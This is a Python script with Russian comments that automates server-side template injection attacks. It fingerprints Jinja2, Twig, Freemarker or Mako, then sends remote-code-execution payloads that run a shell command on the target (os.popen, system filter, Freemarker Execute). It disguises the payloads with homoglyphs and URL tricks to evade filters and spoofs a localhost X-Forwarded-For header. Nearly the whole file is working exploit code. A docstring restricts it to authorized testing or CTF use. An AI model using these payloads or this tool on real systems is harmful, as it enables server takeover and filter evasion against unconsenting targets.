"""
=============================================================================
 scan_SSTI.py — сканер Server-Side Template Injection (SSTI) → RCE
=============================================================================

ЗАЧЕМ:
    Автоматизирует эксплуатацию SSTI в веб-параметре:
      1) detect_engine()   — определяет шаблонизатор пробами {{7*7}} / ${7*7}
         (Jinja2, Twig, Freemarker, Mako) по появлению «49» в ответе;
      2) find_os_class()   — для Jinja2 ищет индекс нужного класса в
         __subclasses__() (os._wrap_close / subprocess.Popen);
      3) generate_payload()— строит RCE-нагрузку под движок для выполнения
         COMMAND (по умолчанию `ls -la`);
      4) obfuscate_payload()— лёгкая обфускация (unicode-гомоглифы, ${%20}) для
         обхода простых фильтров;
      5) clean_output()    — вырезает HTML и достаёт полезный вывод команды.

ГДЕ ПРИМЕНИМО:
    Параметр, значение которого попадает в серверный шаблон (SSTI). Быстрая
    проверка «движок → RCE» на Python/PHP/Java-шаблонизаторах.

ЗАПУСК:
    Задать TARGET_URL / VULN_PARAM / COMMAND в начале файла, затем:
    python3 scan_SSTI.py

ЗАВИСИМОСТИ: requests, termcolor.
⚠ Только для авторизованного тестирования / CTF.
=============================================================================
"""
import requests
import re
from urllib.parse import quote
from termcolor import colored

# Конфигурация (задайте свои значения)
TARGET_URL = "http://172.23.120.40/page.php"
VULN_PARAM = "secret"
COMMAND = "ls -la"  # Команда для выполнения

class SSTIScanner:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
            'X-Forwarded-For': '127.0.0.1'
        })
        
    def detect_engine(self):
        engines = {
            'jinja2': {
                'payloads': ['{{7*7}}', '{{7*\'7\'}}'], 
                'patterns': [r'49', r'7777777']
            },
            'twig': {
                'payloads': ['{{7*7}}'], 
                'patterns': [r'49']
            },
            'freemarker': {
                'payloads': ['${7*7}'], 
                'patterns': [r'49']
            },
            'mako': {
                'payloads': ['${7*7}'], 
                'patterns': [r'49']
            }
        }
        
        for engine, config in engines.items():
            for idx, payload in enumerate(config['payloads']):
                try:
                    url = f"{TARGET_URL}?{VULN_PARAM}={quote(payload)}"
                    response = self.session.get(url, timeout=15)
                    if re.search(config['patterns'][idx], response.text):
                        return engine
                except Exception as e:
                    continue
        return None

    def find_os_class(self):
        payload = quote("{{ ''.__class__.__mro__[1].__subclasses__() }}")
        try:
            response = self.session.get(f"{TARGET_URL}?{VULN_PARAM}={payload}")
            classes = response.text.split(',')
            
            for idx, class_def in enumerate(classes):
                if any(x in class_def for x in ['os._wrap_close', 'subprocess.Popen', 'warnings.catch_warnings']):
                    return idx
            return None
        except:
            return None

    def generate_payload(self, engine, class_idx=None):
        payloads = {
            'jinja2': [
                f"{{{{ ''.__class__.__mro__[1].__subclasses__()[{class_idx}].__init__.__globals__.__builtins__.__import__('os').popen('{COMMAND}').read() }}}}",
                f"{{{{ config.__class__.__init__.__globals__['os'].popen('{COMMAND}').read() }}}}"
            ],
            'twig': [
                f"{{{{['{COMMAND}']|filter('system')}}}}",
                f"{{{{_self.env.registerUndefinedFilterCallback('exec')}}{{['{COMMAND}']|filter('system')}}}}"
            ],
            'freemarker': [
                f"${{\"freemarker.template.utility.Execute\"?new()(\"{COMMAND}\")}}"
            ],
            'mako': [
                f"${{__import__('os').popen('{COMMAND}').read()}}"
            ]
        }
        return payloads.get(engine, [])

    def obfuscate_payload(self, payload):
        return payload.replace("os", "o\u0173") \
                      .replace("popen", "p\u0233pen") \
                      .replace(" ", "${%20}")

    def execute_command(self, payload):
        try:
            response = self.session.get(
                f"{TARGET_URL}?{VULN_PARAM}={quote(payload)}",
                timeout=20
            )
            return self.clean_output(response.text)
        except Exception as e:
            return f"Error: {str(e)}"

    def clean_output(self, text):
        clean = re.sub('<[^<]+?>', '', text)
        match = re.search(r'(total\s+\d+[\s\S]+?)\n\n', clean)
        return match.group(1) if match else "No recognizable output found"

    def run(self):
        print(colored("[+] Starting SSTI scan...", "blue"))
        
        # Обнаружение движка
        engine = self.detect_engine()
        if not engine:
            print(colored("[-] Template engine not detected", "red"))
            return
        
        print(colored(f"[+] Detected engine: {engine.upper()}", "green"))
        
        # Поиск индекса класса для Jinja2
        class_idx = None
        if engine == 'jinja2':
            class_idx = self.find_os_class()
            if class_idx is None:
                print(colored("[-] Failed to find OS class index", "red"))
                return
            print(colored(f"[+] Found vulnerable class index: {class_idx}", "green"))
        
        # Генерация и выполнение payload
        for payload in self.generate_payload(engine, class_idx):
            obfuscated = self.obfuscate_payload(payload)
            print(colored(f"[*] Trying payload: {payload[:70]}...", "yellow"))
            
            output = self.execute_command(obfuscated)
            if "No recognizable output" not in output:
                print(colored("\n[+] Command output:", "green"))
                print(colored(output, "white"))
                return
        
        print(colored("[-] All payloads failed", "red"))

if __name__ == "__main__":
    scanner = SSTIScanner()
    scanner.run()
